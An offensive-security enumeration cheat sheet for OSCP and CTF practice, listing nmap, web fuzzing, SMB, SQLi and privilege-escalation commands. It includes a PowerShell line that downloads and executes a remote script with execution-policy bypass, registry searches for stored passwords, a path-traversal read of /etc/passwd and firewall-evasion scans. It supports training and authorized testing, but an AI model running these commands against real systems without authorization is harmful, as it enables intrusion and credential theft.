# Enumeration-notes
# Comprehensive Enumeration Notes

## **1. Network Enumeration**

### **1.1 Basic Network Scanning**
#### **Nmap Scans**
```bash
nmap -sC -sV -p- -oN full_scan.txt <target_ip>
```
- `-sC` : Runs default scripts
- `-sV` : Version detection
- `-p-` : Scans all 65535 ports
- `-oN` : Saves output

#### **Aggressive Scan**
```bash
nmap -A -T4 <target_ip>
```
- `-A` : Enables OS detection, script scanning, and traceroute
- `-T4` : Faster timing template

#### **Specific Port Scan**
```bash
nmap -p 21,22,80,443 <target_ip>
```

#### **Firewall Evasion**
```bash
nmap -f -D RND:5 <target_ip>
```
- `-f` : Fragment packets
- `-D RND:5` : Use 5 random decoys

### **1.2 Advanced Network Scanning**

#### **Scanning for Live Hosts (Ping Sweep)**
```bash
nmap -sn 10.10.10.0/24
```

#### **Enumerating Open Ports**
```bash
nc -zv <target_ip> 1-65535
```

#### **Banner Grabbing**
```bash
nc -nv <target_ip> <port>
```

#### **SNMP Enumeration**
```bash
snmpwalk -c public -v1 <target_ip>
```

#### **SMB Enumeration**
```bash
smbmap -H <target_ip>
enum4linux -a <target_ip>
```

---

## **2. Web Enumeration**

### **2.1 Directory and File Enumeration**
#### **Gobuster**
```bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

#### **FFUF for Fuzzing**
```bash
ffuf -u http://<target_ip>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

#### **Nikto (Web Vulnerability Scanner)**
```bash
nikto -h http://<target_ip>
```

### **2.2 CMS Enumeration**
#### **WordPress**
```bash
wpscan --url http://<target_ip> --enumerate u,p
```

#### **Joomla**
```bash
joomscan --url http://<target_ip>
```

---

## **3. System Enumeration**

### **3.1 Linux Enumeration**
#### **Check OS & Kernel Version**
```bash
uname -a
cat /etc/os-release
```

#### **Check SUID Binaries**
```bash
find / -perm -4000 -type f 2>/dev/null
```

#### **Checking Running Processes**
```bash
ps aux
```

### **3.2 Windows Enumeration**
#### **Check User Privileges**
```powershell
whoami /priv
```

#### **Find Stored Credentials**
```powershell
reg query HKLM /f "password" /t REG_SZ /s
```

---

## **4. Privilege Escalation**

### **4.1 Linux PrivEsc**
#### **Find Writable Folders**
```bash
find / -writable -type d 2>/dev/null
```

#### **Check Cron Jobs**
```bash
cat /etc/crontab
```

### **4.2 Windows PrivEsc**
#### **Check Service Misconfigurations**
```powershell
Get-Service | Where-Object {$_.StartMode -eq "Auto"}
```

#### **Find Weak Permissions**
```powershell
icacls C:\Users\*
```

---

## **5. OSCP-Level Enumeration**

### **5.1 Manual Enumeration**
#### **Check for SSH Keys**
```bash
ls -la ~/.ssh/
```

#### **Find Writable Files**
```bash
find / -perm -2 -type f 2>/dev/null
```

### **5.2 Automated Enumeration Tools**
#### **LinPEAS (Linux PrivEsc Script)**
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

#### **WinPEAS (Windows PrivEsc Script)**
```powershell
powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat')"
```

### **5.3 Exploiting Misconfigurations**
#### **Sudo Exploit (Linux)**
```bash
sudo -l
sudo /bin/bash
```

#### **Unquoted Service Path (Windows)**
```powershell
wmic service get name,displayname,pathname,startmode
```

---

## **6. Fuzzing Techniques**

### **6.1 Burp Suite Intruder**
- Load target URL
- Identify the parameter
- Use wordlist-based fuzzing

### **6.2 SQL Injection Fuzzing**
```bash
sqlmap -u "http://<target_ip>/index.php?id=1" --dbs
```

### **6.3 LFI/RFI Exploitation**
```bash
curl http://<target_ip>/?file=../../../../etc/passwd
```

---

## **Conclusion**
This **detailed enumeration cheat sheet** covers all necessary commands, tools, and techniques required for **network, web, system enumeration, privilege escalation, and OSCP-level enumeration**. Use this as a **quick reference** while solving CTF challenges and real-world pentesting engagements!

---

💡 **Tip:** Always document findings and outputs using:
```bash
tee enumeration_results.txt
```

🚀 Happy Hacking!

